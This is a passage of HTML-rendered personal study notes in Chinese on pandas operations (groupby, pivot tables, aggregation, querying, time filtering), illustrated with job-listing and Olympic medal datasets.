class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;奖牌类型&#x27;</span>],index = [<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>]).count()[<span class="string">&#x27;奖牌类型&#x27;</span>])</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>]).count()[[<span class="string">&#x27;奖牌类型&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby 联合 apply</span></span><br><span class="line">q2[<span class="string">&#x27;恋爱的男生比例&#x27;</span>] = df[df[<span class="string">&#x27;romantic&#x27;</span>]==<span class="string">&#x27;yes&#x27;</span>].groupby(<span class="string">&#x27;age&#x27;</span>).apply(<span class="keyword">lambda</span> x:x.sex==<span class="string">&#x27;M&#x27;</span>).groupby(<span class="string">&#x27;age&#x27;</span>).<span class="built_in">sum</span>()/q2_rom.groupby(<span class="string">&#x27;age&#x27;</span>).count()[<span class="string">&#x27;sex&#x27;</span>]</span><br><span class="line"><span class="comment"># 相当于在[]里面写条件</span></span><br><span class="line">df[df[<span class="string">&#x27;smoker&#x27;</span>]==<span class="string">&#x27;yes&#x27;</span>].groupby(<span class="string">&#x27;age区间&#x27;</span>).count()</span><br><span class="line"><span class="comment"># count和sum有区别，一个是计算bool后求和，一个在条件筛选后求个数</span></span><br><span class="line">df.groupby(<span class="string">&#x27;age区间&#x27;</span>).apply(<span class="keyword">lambda</span> x:x.smoker==<span class="string">&#x27;yes&#x27;</span>).groupby(<span class="string">&#x27;age区间&#x27;</span>).<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把groupby的元素取出来</span></span><br><span class="line">pieces = <span class="built_in">dict</span>(<span class="built_in">list</span>(df.groupby(<span class="string">&#x27;key1&#x27;</span>)))</span><br><span class="line">pieces[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="comment"># groupby 使用字典</span></span><br><span class="line">by_column = people.groupby(mapping, axis=<span class="number">1</span>)</span><br><span class="line">by_column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>unstack</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算前十名各国每日奖牌数量合计</span></span><br><span class="line"><span class="comment"># 注意：对于第一天没有数据的国家用0填充，其余时间的缺失值用上一日数据填充</span></span><br><span class="line">countries = df2.groupby(<span class="string">&#x27;国家&#x27;</span>).count().sort_values(<span class="string">&#x27;奖牌类型&#x27;</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">&#x27;国家&#x27;</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">&#x27;获奖时间&#x27;</span>,<span class="string">&#x27;国家&#x27;</span>]).count()[<span class="string">&#x27;奖牌类型&#x27;</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 对于两层的Series </span></span><br><span class="line">data = pd.Series(np.random.randn(<span class="number">9</span>),</span><br><span class="line">                 index=[[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                        [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]])</span><br><span class="line"><span class="comment"># 选第二个索引值的操作：</span></span><br><span class="line">data[:,<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">data.unstack().iloc[:,<span class="number">1</span>]</span><br></pre></td></tr></table></figure><ul><li>数据聚合</li></ul><table><thead><tr><th align="right">positionName</th><th align="right">companySize</th><th align="right">industryField</th><th align="right">financeStage</th><th align="right">companyLabelList</th><th align="right">firstType</th><th align="right">secondType</th><th align="right">thirdType</th><th align="right">createTime</th><th align="right">district</th><th align="right">salary</th><th align="right">workYear</th><th align="right">jobNature</th><th align="right">education</th><th align="right">positionAdvantage</th><th align="right">imState</th><th align="right">score</th><th align="right">matchScore</th><th align="right">famousCompany</th><th align="right">Hobby</th><th></th></tr></thead><tbody><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘绩效奖金’</td></tr><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘带薪年假’</td></tr><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘定期体检’</td></tr><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘弹性工作’</td></tr><tr><td align="right">1</td><td align="right">数据建模</td><td align="right">150-500人</td><td align="right">电商</td><td align="right">B轮</td><td align="right">[‘年终奖金’, ‘做五休二’, ‘六险一金’, ‘子女福利’]</td><td align="right">开发|测试|运维类</td><td align="right">数据开发</td><td align="right">建模</td><td align="right">2020&#x2F;3&#x2F;16 11:08</td><td align="right">滨江区</td><td align="right">15000</td><td align="right">3-5年</td><td align="right">全职</td><td align="right">本科</td><td align="right">六险一金,定期体检,丰厚年终</td><td align="right">disabled</td><td align="right">176</td><td align="right">32.559414</td><td align="right">False</td><td>‘年终奖金’</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">分组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 分组，但不作为索引</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, as_index=<span class="literal">False</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># 分组 pandas.core.series.Series 格式</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby(df[<span class="string">&#x27;district&#x27;</span>]).mean() </span><br><span class="line"><span class="comment"># 分组 pandas.core.frame.DataFrame 格式</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;salary&#x27;</span>].mean().to_frame()</span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[[<span class="string">&#x27;salary&#x27;</span>]].mean()</span><br><span class="line">df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(<span class="string">&#x27;district&#x27;</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相同的结果</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby([df[<span class="string">&#x27;workYear&#x27;</span>],</span><br><span class="line">                      df[<span class="string">&#x27;education&#x27;</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>]).mean()[<span class="string">&#x27;salary&#x27;</span>]</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>])[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>])[<span class="string">&#x27;salary&#x27;</span>].agg(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby 用字典</span></span><br><span class="line"><span class="comment">#将 score 和 matchScore 的和记为总分，与 salary 列同时进行分组，并查看结果</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;薪资&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;总分&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;总分&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分组计算不同行政区，薪水的最小值、最大值和平均值</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对不同行政区进行分组，并统计薪水的均值、中位数、方差，以及得分的均值</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(</span><br><span class="line">    &#123;<span class="string">&#x27;salary&#x27;</span>: [np.mean, np.median, np.std], <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对不同岗位(positionName)进行分组，并统计其薪水(salary)中位数和得分(score)均值</span></span><br><span class="line">df.groupby(<span class="string">&#x27;positionName&#x27;</span>).agg(&#123;<span class="string">&#x27;salary&#x27;</span>: np.median, <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">统计每个区不同大小公司个数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 方式1：groupby</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>])[<span class="string">&#x27;companySize&#x27;</span>].count()</span><br><span class="line"><span class="comment"># 方式2：value_counts() 排序按照个数降序</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看group的结果</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).groups</span><br><span class="line"><span class="comment"># 将数据按照 district、salary 进行分组，并查看西湖区薪资为 30000 的工作</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).get_group((<span class="string">&quot;西湖区&quot;</span>,<span class="number">30000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">我们将会用到 transform 而不是 apply或者mean。 原因是， transform 将会保持 dataframe 矩阵的形状(shape)(就是行列数不变)而 apply 会改变矩阵的形状。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 在原数据框 df 新增一列，数值为该区的平均薪资水平</span></span><br><span class="line">df[<span class="string">&#x27;该区平均工资&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算各行政区的企业领域（industryField）包含电商的总数</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&quot;industryField&quot;</span>].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&#x27;电商&#x27;</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 positionName 的长度进行分组，并计算不同长度岗位名称的薪资均值</span></span><br><span class="line">df.set_index(<span class="string">&quot;positionName&quot;</span>).groupby(<span class="built_in">len</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">where 等同于写在df[]中的条件</span></span><br><span class="line"><span class="string">query 函数我类似sql语言中的where 相当于在df中写sql</span></span><br><span class="line"><span class="string">filter 类似sql中groupby后的having</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># where</span></span><br><span class="line">work_index.where(work_index[<span class="string">&#x27;地市&#x27;</span>]==<span class="string">&#x27;厦门市&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">work_index.query(<span class="string">&#x27;地市==&quot;厦门市&quot;&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">work_index[work_index[<span class="string">&#x27;地市&#x27;</span>]==<span class="string">&#x27;厦门市&#x27;</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">work_index.loc[work_index[<span class="string">&#x27;地市&#x27;</span>]==<span class="string">&#x27;厦门市&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取平均工资小于 30000 的行政区的全部数据</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过匿名函数分组 根据 createTime 列，计算每天不同 行政区 新增的岗位数量</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">&#x27;district&#x27;</span>].value_counts()).rename_axis([<span class="string">&quot;发布日&quot;</span>, <span class="string">&quot;行政区&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 df2 计算获得奖牌最多的运动员</span></span><br><span class="line">df2[<span class="string">&#x27;运动员&#x27;</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">df.groupby(<span class="string">&#x27;运动员&#x27;</span>).count()[<span class="string">&#x27;奖牌类型&#x27;</span>].sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看各国在不同项目上的获奖牌情况</span></span><br><span class="line"><span class="comment"># 这里括号内要写df[]</span></span><br><span class="line">df2[<span class="string">&#x27;总奖牌数&#x27;</span>].groupby([df2[<span class="string">&#x27;国家&#x27;</span>],df2[<span class="string">&#x27;运动类别&#x27;</span>]]).count().to_frame()</span><br><span class="line"></span><br><span class="line">df2.groupby([<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>]).count()[<span class="string">&#x27;总奖牌数&#x27;</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;奖牌类型&#x27;</span>],index = [<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照列计算平均值</span></span><br><span class="line">df.mean(axis=<span class="string">&#x27;columns&#x27;</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#不是0，1是算每列的均值然后然后合并为一行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x.<span class="built_in">max</span>()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(最低工资=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;min&#x27;</span>), 最高工资=(</span><br><span class="line">    <span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;max&#x27;</span>), 平均工资=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;mean&#x27;</span>), 最大值与均值差值=(<span class="string">&#x27;salary&#x27;</span>, myfunc)).rename_axis([<span class="string">&quot;行政区&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 总分、高端人才得分、办学层次得分的最大最小值、中位数、均值</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;总分&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;高端人才得分&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;办学层次得分&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>查看数据信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据行列数</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># 查看数据量</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># 查看 数值型 列的统计信息，计数、均值什么的</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># 查看 离散型 列的统计信息，计数、频率什么</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># 查看 全部 列的统计信息</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="comment"># 去除重复的</span></span><br><span class="line">df[<span class="string">&#x27;a&#x27;</span>].unique()</span><br></pre></td></tr></table></figure><ul><li>查看统计数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据行列数</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># 查看数据量</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># 查看 数值型 列的统计信息，计数、均值什么的</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># 查看 离散型 列的统计信息，计数、频率什么</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># 查看 全部 列的统计信息</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算 总分、高端人才得分、办学层次得分的最大最小值、中位数、均值</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;总分&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;高端人才得分&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;办学层次得分&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询</span></span><br><span class="line">df.query(<span class="string">&#x27;金牌数+银牌数 &gt; 15&#x27;</span>)</span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>].isin([<span class="string">&#x27;工业&#x27;</span>,<span class="string">&#x27;建筑业&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>]==<span class="string">&#x27;工业&#x27;</span>)|(df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>]==<span class="string">&#x27;建筑业&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;工业|建筑业&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取全部列名中以 “数” 结尾的列</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;数&#x27;</span>)]</span><br><span class="line"><span class="comment"># 提取第1，2，3，4列</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>查询类型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>数据展开</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果行A和行C存在[a,b,c]这样的列表，我们可以用</span></span><br><span class="line">df5.explode([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>数据累加</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum()</span><br><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>按时间进行筛选</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">一般来说可以把datetime作为索引，比较方便我们进行筛选操作</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 将DateTime转成日期格式</span></span><br><span class="line">df[<span class="string">&#x27;DateTime&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;DateTime&#x27;</span>])</span><br><span class="line"><span class="comment"># 将日期设为index</span></span><br><span class="line">df = df.set_index(<span class="string">&#x27;DateTime&#x27;</span>)</span><br><span class="line"><span class="comment"># 筛选从2019年3月1号到2019年3月10号整十天的数据</span></span><br><span class="line">df1 = df[<span class="string">&#x27;2019-03-01&#x27;</span>:<span class="string">&#x27;2019-03-10&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果我们不想或者不好将datetime设置为索引，则可以使用如下方法</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 设置开始时间</span></span><br><span class="line">from_date = df[<span 